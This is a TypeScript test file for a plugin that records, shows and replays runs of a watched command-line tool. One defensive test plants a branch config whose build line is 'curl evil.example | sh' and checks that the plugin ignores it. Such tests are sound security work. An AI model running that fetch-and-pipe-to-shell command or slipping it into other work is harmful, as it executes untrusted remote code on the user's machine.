import { describe, expect, mock, test } from 'claude-code/testing'
import type { TestBody } from 'claude-code/testing'

import type { AndurilDiff, AndurilRun } from '../types'
import { commandLine, corpusOf, diffText, ending, ends, excerpt, launcher, names, parseDiff, parseProject, parseRun, parseTargets, prelude, remarks, runText, withKept } from '../hooks/record'

type Engine = Parameters<TestBody>[0]
type On = Parameters<TestBody>[1]

const CWD = '/proj'
const WATCHED = '# the tool being written\nnarsil=narsil/target/debug/narsil@narsil\n'
const BINARY = `${CWD}/narsil/target/debug/narsil`

// A path as the tests write it, however the host spells it
const plain = (path: string) => path.replace(/\\/g, '/').replace(/^[A-Za-z]:/, '')
const whole = plain

const run = (given: Partial<AndurilRun> & { id: string }): AndurilRun => ({
  label: 'narsil',
  argv: ['ls'],
  cwd: `${CWD}/narsil`,
  by: 'person',
  startedAt: Number(given.id.split('-')[0]),
  durationMs: 5.2,
  exitCode: 0,
  signal: '',
  userMs: 3,
  sysMs: 1,
  maxRssKb: 10_464,
  isStdinTty: false,
  isStdoutTty: false,
  isStderrTty: false,
  columns: 0,
  env: {},
  binary: BINARY,
  builtAt: 0,
  stdout: '',
  stderr: '',
  stdoutBytes: given.stdout?.length ?? 0,
  stderrBytes: given.stderr?.length ?? 0,
  ...given,
})

const outcome = (exitCode: number) => ({ exitCode, signal: '', durationMs: 4, stdoutBytes: 10, stderrBytes: 0, error: '' })

// What the replay script answers: one run that changed between HEAD and the working tree, one that did not
const ANSWER = {
  label: 'narsil',
  from: { ref: 'HEAD', sha: '223f93475f9d1f4424d8ba0ddc80581b3ce94f64', error: '' },
  to: { ref: 'work', sha: '', error: '' },
  error: '',
  untraced: '',
  cases: [
    {
      line: 'narsil seal chronicle.jsonl',
      isChanged: true,
      from: outcome(0),
      to: outcome(0),
      stdoutDiff: '',
      stderrDiff: '',
      files: [
        { path: 'root/chronicle.jsonl.seal', change: 'changed', diff: '--- from/root/chronicle.jsonl.seal\n+++ to/root/chronicle.jsonl.seal\n@@ -1 +1 @@\n-fnv1a64 6be6\n+fnv-1a 6be6' },
        { path: 'root/extra.bin', change: 'added', diff: '' },
      ],
      outside: { from: [], to: ['/tmp/outside.txt'] },
      transient: { from: ['root/scratch.tmp'], to: ['root/scratch.tmp'] },
    },
    {
      line: 'narsil show 999',
      isChanged: true,
      from: outcome(1),
      to: outcome(2),
      stdoutDiff: '',
      stderrDiff: '--- from/stderr\n+++ to/stderr\n@@ -1 +1 @@\n-narsil: no lighting 999 in the chronicle\n+narsil: lighting 999 is not in the chronicle',
      files: [],
      outside: { from: [], to: [] },
      transient: { from: [], to: [] },
    },
    { line: 'narsil ls', isChanged: false, from: outcome(0), to: outcome(0), stdoutDiff: '', stderrDiff: '', files: [], outside: { from: [], to: [] }, transient: { from: [], to: [] } },
  ],
}

const KEPT = `${WATCHED}narsil.build=cargo build --manifest-path narsil/Cargo.toml\nnarsil.mask=generated at \\S+\n$ narsil show 999\n$ narsil ls\n`

const LISTED = run({ id: '1000-1', argv: ['ls', '--format', 'json'], stdout: '[{"id":1}]\n', by: 'claude' })
const MISSING = run({ id: '2000-2', argv: ['show', '999'], exitCode: 1, stderr: 'narsil: no lighting 999 in the chronicle\n' })
const PANICKED = run({
  id: '3000-3',
  argv: ['--chronicle', 'an empty.jsonl', 'show', '1'],
  exitCode: 101,
  stderr: "\nthread 'main' panicked at src/main.rs:154:18:\nindex out of bounds: the len is 0 but the index is 0\n",
})

/** Stands for the machine beneath the mod: its files, by absolute path, and the commands it was asked to run. */
const machine = (on: On, given: Record<string, string> = {}) => {
  const files: Record<string, string> = { ...given }
  const ran: string[] = []
  const written: string[] = []

  mock.clock(on, { now: 1_800_000_000_000 })
  on('session.cwd', () => ({ value: CWD }) as never)
  on('fs.exists', (_, e) => ({ value: whole(e.path) in files }) as never)
  on('fs.read', (_, e) => {
    const text = files[whole(e.path)]
    if (text === undefined) throw new Error(`ENOENT: ${e.path}`)

    return { value: text } as never
  })
  on('fs.write', (_, e) => {
    files[whole(e.path)] = e.text
    written.push(whole(e.path))

    return { value: undefined } as never
  })
  on('fs.list', (_, e) => {
    const folder = `${whole(e.path ?? CWD)}/`
    const entries = Object.keys(files)
      .filter(path => path.startsWith(folder) && !path.slice(folder.length).includes('/'))
      .map(path => ({ name: path.slice(folder.length), kind: 'file', size: files[path]?.length ?? 0, mtimeMs: 0, isLink: false }))

    return { value: entries } as never
  })
  // What the replay script is handed and what it answers: a test sets the answer
  const replay = { jobs: [] as Record<string, unknown>[], answer: '' }
  on('process.run', (_, e) => {
    const argv = e.argv
    const given = e as unknown as { stdin?: string; init?: { stdin?: string } }
    const isReplay = argv.some(arg => arg.endsWith('anduril_replay.py'))

    if (isReplay) replay.jobs.push(JSON.parse(given.stdin ?? given.init?.stdin ?? '{}') as Record<string, unknown>)
    else ran.push(argv.join(' '))

    return { value: { exitCode: 0, stdout: isReplay ? replay.answer : '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } } as never
  })

  return {
    files,
    ran,
    written,
    replay,
    record: (one: AndurilRun) => {
      files[`${CWD}/.anduril/runs/${one.id}.json`] = JSON.stringify(one)
    },
  }
}

const watching = (on: On, records: AndurilRun[] = []) => {
  const world = machine(on, { [`${CWD}/.claude/anduril`]: WATCHED, [BINARY]: 'ELF' })
  for (const one of records) world.record(one)

  return world
}

const mountPane = ($: Engine, surface: 'terminal' | 'desktop' = 'terminal') =>
  $.ui.mount({ plugin: 'anduril', surface, component: 'Pane', props: { bodyColumns: 100 } as never, requestId: 'anduril' })

// The facts a system prompt is composed from, as far as a test names them
const FACTS = { model: 'claude-test', promptModel: 'claude-test', surfaces: [], tools: [], outputStyle: null, traits: [] } as never

const call = async ($: Engine, tool: string, input: Record<string, unknown> = {}) => String((await $.tool.call({ tool, ...input } as never)).result)

describe('what is watched', () => {
  test('reads the tools a project names, a line each, with the binary and the source of each', () => {
    expect(parseTargets(`${WATCHED}\nnot a line\nquill = /opt/quill/bin/quill\n`, CWD)).toEqual([
      { label: 'narsil', binary: BINARY, roots: [`${CWD}/narsil`], build: '', masks: [] },
      { label: 'quill', binary: '/opt/quill/bin/quill', roots: [], build: '', masks: [] },
    ])
  })

  test('takes a command to name a tool when the name stands as a word, and not as a part of a path', () => {
    const targets = parseTargets(WATCHED, CWD)

    expect(names('narsil ls | head -3', targets)).toBe(true)
    expect(names('cd /tmp && NO_COLOR=1 narsil show 3', targets)).toBe(true)
    expect(names('narsil/target/debug/narsil ls', targets)).toBe(false)
    expect(names('./target/debug/narsil ls', targets)).toBe(false)
    expect(names('git status', targets)).toBe(false)
  })

  test('writes a launcher that hands the run to the shim with every argument as given', () => {
    const [target] = parseTargets(WATCHED, CWD)
    const text = launcher({ shim: "/mods/it's here/shim/anduril_shim.py", cwd: CWD, target: target! })

    expect(text.startsWith('#!/bin/sh\n')).toBe(true)
    expect(text).toContain(`exec python3 '/mods/it'\\''s here/shim/anduril_shim.py' --dir '/proj/.anduril' --label 'narsil' --binary '${BINARY}' -- "$@"`)
  })
})

describe('the runs a project keeps', () => {
  test('reads how a tool is built, what to leave out of its streams, and the runs to play, each once', () => {
    const project = parseProject(`${KEPT}$ narsil ls\nquill.build=make\n$ quill --version\n`, CWD)

    expect(project.targets).toEqual([{ label: 'narsil', binary: BINARY, roots: [`${CWD}/narsil`], build: 'cargo build --manifest-path narsil/Cargo.toml', masks: ['generated at \\S+'] }])
    expect(project.corpus).toEqual(['narsil show 999', 'narsil ls', 'quill --version'])
    expect(corpusOf(project.corpus, 'narsil')).toEqual(['narsil show 999', 'narsil ls'])
  })

  test('keeps one more run at the end of the file, and a run already kept once', () => {
    expect(withKept('narsil=bin', 'narsil ls')).toBe('narsil=bin\n$ narsil ls\n')
    expect(withKept('narsil=bin\n$ narsil ls\n', 'narsil ls')).toBe('narsil=bin\n$ narsil ls\n')
    expect(withKept('', 'narsil ls')).toBe('$ narsil ls\n')
  })

  test('says a comparison by the runs that changed, how each did, and the ones that did not', () => {
    const said = diffText(parseDiff(JSON.stringify(ANSWER), 0) as AndurilDiff)

    expect(said).toMatch(/^narsil, the working tree against HEAD \(223f934\): 2 of 3 kept runs changed\./)
    expect(said).toContain('changed: narsil show 999\n  exit 1 → 2\n  --- from/stderr')
    expect(said).toContain('  +narsil: lighting 999 is not in the chronicle')
    expect(said).toContain('unchanged: narsil ls')
  })

  test('says what a run did to files that the builds do not agree on: left, written outside, or written and removed', () => {
    const made = parseDiff(JSON.stringify(ANSWER), 0) as AndurilDiff
    const said = diffText(made)

    expect(said).toContain('changed: narsil seal chronicle.jsonl\n  file root/chronicle.jsonl.seal: not the same\n  file root/extra.bin: the working tree alone left it\n  written outside the folder: HEAD (223f934) nothing; the working tree /tmp/outside.txt')
    expect(said).toContain('  +fnv-1a 6be6')
    // What both builds wrote and removed alike is no difference
    expect(said).not.toContain('written and removed again')
    expect(said).toContain('Written outside the folder the runs were played in, so on this machine: /tmp/outside.txt.')
    expect(said).not.toContain('No run was traced')
    expect(diffText({ ...made, untraced: 'strace is not installed' })).toContain('No run was traced (strace is not installed)')
  })

  test('says why a build was not played in place of what changed', () => {
    const broken = { ...ANSWER, cases: [], to: { ref: 'work', sha: '', error: 'it does not build (cargo build, exit 101):\nerror[E0425]: cannot find value' } }
    const said = diffText(parseDiff(JSON.stringify(broken), 0) as AndurilDiff)

    expect(said).toMatch(/^narsil, the working tree against HEAD \(223f934\): not compared\./)
    expect(said).toContain('the working tree was not played: it does not build')
    expect(parseDiff('Traceback (most recent call last):', 0)).toBeUndefined()
  })
})

describe('a record', () => {
  test('is read back as written, and a file that is none is no run', () => {
    expect(parseRun(JSON.stringify(MISSING))).toEqual(MISSING)
    expect(parseRun('{"id": "1-1", "argv"')).toBeUndefined()
    expect(parseRun('[]')).toBeUndefined()
    expect(parseRun(JSON.stringify({ id: '1-1', argv: ['ls'], by: 'someone', exitCode: '1' }))?.by).toBe('person')
  })

  test('says a run as it was typed, and a panic by its name', () => {
    expect(commandLine(PANICKED)).toBe("narsil --chronicle 'an empty.jsonl' show 1")
    expect(ending(PANICKED)).toBe('101 panic')
    expect(ending(MISSING)).toBe('1')
    expect(ending(run({ id: '1-1', exitCode: 143, signal: 'SIGTERM' }))).toBe('143 SIGTERM')
  })

  test('remarks on colour sent down a pipe, a failure that says nothing, and a reader that left', () => {
    const painted = run({ id: '1-1', stdout: '\u001b[1mID\u001b[0m\n' })

    expect(remarks(painted)).toEqual(['It wrote terminal escape codes to a stdout that was no terminal.'])
    expect(remarks({ ...painted, isStdoutTty: true })).toEqual([])
    expect(remarks(run({ id: '1-2', exitCode: 2 }))).toEqual(['It failed and wrote nothing to stderr.'])
    expect(remarks(run({ id: '1-3', exitCode: 101, stderr: 'failed printing to stdout: Broken pipe (os error 32)' }))[0]).toMatch(/broken pipe/)
  })

  test('is said in full with its streams apart, each cut where asked and saying what is left', () => {
    const long = run({ id: '1-1', stdout: 'a'.repeat(50), stdoutBytes: 9000, stderr: '' })
    const said = runText(long, 20)

    expect(said).toContain('Run 1-1: narsil ls')
    expect(said).toContain('exit 0 after 5.2 ms')
    expect(said).toContain(`stdout (9.0 kB):\n${'a'.repeat(20)}\n… 30 more characters kept, 9.0 kB written in all`)
    expect(said).toContain('stderr: nothing')
  })
})

describe('a stream too long to show whole', () => {
  test('is drawn by its first and last lines, with how many are between', () => {
    const lines = Array.from({ length: 10 }, (_, index) => `line ${index + 1}`)

    expect(excerpt(lines, 10)).toEqual(lines)
    expect(excerpt(lines, 4)).toEqual(['line 1', 'line 2', '… 6 lines not drawn …', 'line 9', 'line 10'])
  })

  test('is held by its start and its end', () => {
    expect(ends('abcdefghij', 10)).toBe('abcdefghij')
    expect(ends('abcdefghij', 4)).toBe('ab\n… 6 characters not held here …\nij')
  })
})

describe('anduril', () => {
  for (const surface of ['terminal', 'desktop'] as const) {
    test(`says how to have a tool watched where none is, on ${surface}`, async ($, on) => {
      machine(on)
      const pane = await mountPane($, surface)

      expect(await pane.find({ text: /no tool watched/ })).toBeDefined()
      expect(await pane.find({ text: /Name one in \.claude\/anduril/ })).toBeDefined()
    })

    test(`lists the runs newest first, and opens one on what it wrote to each stream, on ${surface}`, async ($, on) => {
      watching(on, [LISTED, MISSING, PANICKED])
      const pane = await mountPane($, surface)
      await pane.press({ key: 'refresh' })

      expect(await pane.find({ text: /3 runs · 2 failed/ })).toBeDefined()

      const drawn = await call($, 'mcp__anduril__pane')
      expect(drawn.indexOf('show 1')).toBeLessThan(drawn.indexOf('show 999'))
      expect(drawn.indexOf('show 999')).toBeLessThan(drawn.indexOf('ls --format json'))
      expect(drawn).toMatch(/claude\s+0\s+5\.2 ms\s+\[narsil ls --format json\]/)
      expect(drawn).toMatch(/you\s+101 panic/)

      await pane.press({ key: 'run-2000-2' })
      const opened = await call($, 'mcp__anduril__pane')
      expect(opened).toContain('stdout: nothing')
      expect(opened).toMatch(/stderr 41 B\n\s+narsil: no lighting 999 in the chronicle/)

      await pane.press({ key: 'failed-only' })
      expect(await call($, 'mcp__anduril__pane')).not.toContain('ls --format json')
    })
  }

  test('puts a launcher in place for each tool, once, and says when a tool is not built', async ($, on) => {
    const world = watching(on)
    delete world.files[BINARY]
    const pane = await mountPane($)
    await pane.press({ key: 'refresh' })

    expect(world.files[`${CWD}/.anduril/bin/narsil`]).toContain(`--binary '${BINARY}' -- "$@"`)
    expect(world.files[`${CWD}/.anduril/.gitignore`]).toBe('*\n')
    expect(world.ran).toEqual([`chmod +x ${CWD}/.anduril/bin/narsil`])
    expect(await pane.find({ text: /narsil is not built/ })).toBeDefined()

    world.files[BINARY] = 'ELF'
    await pane.press({ key: 'refresh' })

    expect(world.written.filter(path => path.endsWith('/bin/narsil'))).toHaveLength(1)
    expect(await pane.find({ text: /narsil is not built/ })).toBeUndefined()
  })

  test('puts the launchers first on the PATH of a command that names a tool, and leaves any other as written', async ($, on) => {
    const world = watching(on)
    const commands: string[] = []
    on('tool.call', { tool: 'Bash' }, (_, e) => {
      commands.push(e.command)
      // The run the command made is on disk by the time it answers
      if (e.command.includes('narsil show')) world.record(MISSING)

      return { result: { stdout: '', stderr: '' } } as never
    })
    const pane = await mountPane($)
    await pane.press({ key: 'refresh' })

    await $.tool.call({ tool: 'Bash', command: 'git status' } as never)
    await $.tool.call({ tool: 'Bash', command: 'narsil show 999' } as never)

    expect(commands).toEqual(['git status', `${prelude(CWD)}narsil show 999`])
    expect(commands[1]).toBe(`export PATH='/proj/.anduril/bin':"$PATH" ANDURIL_BY=claude\nnarsil show 999`)
    // And the pane has it without being asked
    expect(await pane.find({ text: /1 run · 1 failed/ })).toBeDefined()
  })

  test('hands Claude the runs as a list it can narrow, and one run in full from its file', async ($, on) => {
    const world = watching(on, [LISTED, MISSING])
    const pane = await mountPane($)
    await pane.press({ key: 'refresh' })

    // Written after the last look, and longer than the session holds of a stream
    world.record({ ...PANICKED, stdout: 'x'.repeat(9000), stdoutBytes: 9000 })

    const listed = await call($, 'mcp__anduril__runs')
    expect(listed).toMatch(/^3 of 3 recorded runs/)
    expect(listed).toContain("3000-3  ")
    expect(listed).toMatch(/1000-1 .* claude {2}exit 0 {2}5\.2 ms {2}narsil ls --format json/)

    const failed = await call($, 'mcp__anduril__runs', { failed: true, grep: '999' })
    expect(failed).toMatch(/^1 of 3 recorded runs/)
    expect(failed).toContain('exit 1')

    const last = await call($, 'mcp__anduril__run', { max: 60_000 })
    expect(last).toContain("Run 3000-3: narsil --chronicle 'an empty.jsonl' show 1")
    expect(last).toContain('exit 101 panic after')
    expect(last).toContain('x'.repeat(9000))
    expect(last).toContain('index out of bounds')

    expect(await call($, 'mcp__anduril__run', { id: '2000-2' })).toContain('stderr (41 B):\nnarsil: no lighting 999 in the chronicle')
    expect(await call($, 'mcp__anduril__run', { id: 'nope' })).toMatch(/No run nope is recorded/)
  })

  test('says how to have a tool watched to a Claude that asks where none is', async ($, on) => {
    machine(on)

    expect(await call($, 'mcp__anduril__runs')).toMatch(/anduril watches no tool here/)
  })

  test('tells Claude to run a watched tool by its name, and says nothing where none is watched', async ($, on) => {
    watching(on)
    on('prompt.compose', () => ({ sections: [{ id: 'intro', text: 'You are Claude.', scope: 'shared' }] }) as never)

    expect((await $.prompt.compose(FACTS)).sections.map(({ id }) => id)).toEqual(['intro'])

    const pane = await mountPane($)
    await pane.press({ key: 'refresh' })
    const { sections } = await $.prompt.compose(FACTS)

    expect(sections.map(({ id }) => id)).toEqual(['intro', 'anduril:watch'])
    expect(sections[1]?.text).toContain('run it by its name (`narsil --help`)')
    expect(sections[1]?.text).toContain(`narsil: ${BINARY}`)
  })

  test('plays the kept runs on the working tree and on HEAD when Claude asks what changed, or on the commits it names', async ($, on) => {
    const world = machine(on, { [`${CWD}/.claude/anduril`]: KEPT, [BINARY]: 'ELF' })
    world.replay.answer = JSON.stringify(ANSWER)

    const said = await call($, 'mcp__anduril__diff')

    expect(said).toMatch(/2 of 3 kept runs changed/)
    expect(said).toContain('exit 1 → 2')
    expect(world.replay.jobs[0]).toEqual({
      home: CWD,
      label: 'narsil',
      binary: BINARY,
      root: `${CWD}/narsil`,
      build: 'cargo build --manifest-path narsil/Cargo.toml',
      masks: ['generated at \\S+'],
      corpus: ['narsil show 999', 'narsil ls'],
      from: 'HEAD',
      to: 'work',
      mergeBase: false,
    })

    await call($, 'mcp__anduril__diff', { from: 'main', to: 'narsil/v0.2.0', mergeBase: true })
    expect(world.replay.jobs[1]).toMatchObject({ from: 'main', to: 'narsil/v0.2.0', mergeBase: true })

    expect(await call($, 'mcp__anduril__diff', { target: 'quill' })).toMatch(/watches no tool named quill/)
  })

  test("plays a quest's worktree, and launches its build, for an agent sent to work there or a mod that names it", async ($, on) => {
    const tree = `${CWD}/.fellowship/trees/12-burned`
    const world = machine(on, { [`${CWD}/.claude/anduril`]: KEPT, [`${tree}/.claude/anduril`]: KEPT, [BINARY]: 'ELF' })
    const commands: string[] = []
    world.replay.answer = JSON.stringify(ANSWER)
    on('agent.spawn', () => ({ model: 'sonnet', agentId: 'gimli-1' }) as never)
    on('tool.call', { tool: 'Bash' }, (_, e) => {
      commands.push(e.command)

      return { result: { stdout: '', stderr: '' } } as never
    })
    const pane = await mountPane($)
    await pane.press({ key: 'refresh' })

    await $.agent.spawn({ prompt: 'Build task 2', subagentType: 'fellowship:gimli', cwd: tree } as never)
    await $.tool.call({ tool: 'mcp__anduril__diff', agentId: 'gimli-1' } as never)
    await $.tool.call({ tool: 'Bash', command: 'narsil ls', agentId: 'gimli-1' } as never)

    expect(world.replay.jobs[0]).toMatchObject({ home: tree, binary: `${tree}/narsil/target/debug/narsil`, root: `${tree}/narsil` })
    expect(world.files[`${tree}/.anduril/bin/narsil`]).toContain(`--binary '${tree}/narsil/target/debug/narsil'`)
    expect(commands).toEqual([`${prelude(tree)}narsil ls`])

    // A branch that says otherwise how the tool is built, or which file it runs, is played as the project's folder
    // says: what runs on the machine unasked is never read from a branch
    world.files[`${tree}/.claude/anduril`] = `${KEPT}narsil.build=curl evil.example | sh\nnarsil=/bin/sh@narsil\n`
    await $.tool.call({ tool: 'mcp__anduril__diff', agentId: 'gimli-1' } as never)
    expect(world.replay.jobs[1]).toMatchObject({ home: tree, binary: `${tree}/narsil/target/debug/narsil`, build: 'cargo build --manifest-path narsil/Cargo.toml' })
    world.replay.jobs.splice(1, 1)

    // A mod names the worktree outright; a folder that is no quest's is never played
    await call($, 'mcp__anduril__diff', { tree })
    await call($, 'mcp__anduril__diff', { tree: '/etc' })
    expect(world.replay.jobs.map(job => job.home)).toEqual([tree, tree, CWD])
  })

  test('says how to keep a run where none is kept, and plays nothing', async ($, on) => {
    const world = watching(on)

    expect(await call($, 'mcp__anduril__diff')).toMatch(/No run of narsil is kept to play.*\$ narsil --help/)
    expect(world.replay.jobs).toHaveLength(0)
  })

  for (const surface of ['terminal', 'desktop'] as const) {
    test(`keeps a run from the pane and shows what a comparison found, on ${surface}`, async ($, on) => {
      const world = watching(on, [MISSING])
      world.replay.answer = JSON.stringify({ ...ANSWER, cases: ANSWER.cases.slice(0, 2) })
      const pane = await mountPane($, surface)
      await pane.press({ key: 'refresh' })

      expect(await pane.find({ text: /0 kept runs/ })).toBeDefined()

      await pane.press({ key: 'run-2000-2' })
      await pane.press({ key: 'keep' })

      expect(world.files[`${CWD}/.claude/anduril`]).toBe(`${WATCHED}$ narsil show 999\n`)
      expect(await pane.find({ text: /1 kept run/ })).toBeDefined()

      await pane.press({ key: 'diff' })

      expect(world.replay.jobs[0]).toMatchObject({ corpus: ['narsil show 999'], from: 'HEAD', to: 'work' })
      const drawn = await call($, 'mcp__anduril__pane')
      expect(drawn).toMatch(/narsil, the working tree against HEAD \(223f934\): 2 of 2 kept runs changed/)
      expect(drawn).toMatch(/narsil show 999 exit 1 → 2/)
      expect(drawn).toContain('+narsil: lighting 999 is not in the chronicle')
      expect(drawn).toContain('file root/extra.bin: the working tree alone left it')
      expect(drawn).toContain('+fnv-1a 6be6')
      expect(drawn).toContain('Written outside the folder the runs were played in, so on this machine: /tmp/outside.txt')

      await pane.press({ key: 'diff-hide' })
      expect(await call($, 'mcp__anduril__pane')).not.toContain('kept runs changed')
    })
  }
})
